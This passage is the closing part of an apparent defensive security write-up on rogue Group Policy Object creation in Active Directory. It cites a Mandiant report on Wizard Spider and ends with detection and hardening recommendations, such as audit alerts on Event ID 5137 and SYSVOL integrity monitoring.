- **Impact:** Multiple ransomware campaigns; credential theft; data exfiltration
- **Reference:** [Mandiant Report - Wizard Spider TTPs](https://www.mandiant.com/resources/wizardspider-acronis-report)

---

## Conclusion & Recommendations

**Creating rogue GPOs is a highly stealthy persistence and escalation technique used by advanced threat actors.** Organizations must:

1. **Restrict** GPO creation permissions to Domain Admins only
2. **Enable** real-time audit logging of Event ID 5137 with immediate alerts
3. **Implement** comprehensive SYSVOL file integrity monitoring
4. **Maintain** baseline inventory of approved GPOs for comparison
5. **Regularly audit** orphaned GPOs and remove them immediately
6. **Monitor** LDAP writes to AD policy containers

Failure to address rogue GPO creation vulnerabilities allows attackers to maintain undetected, persistent access for months or years.

---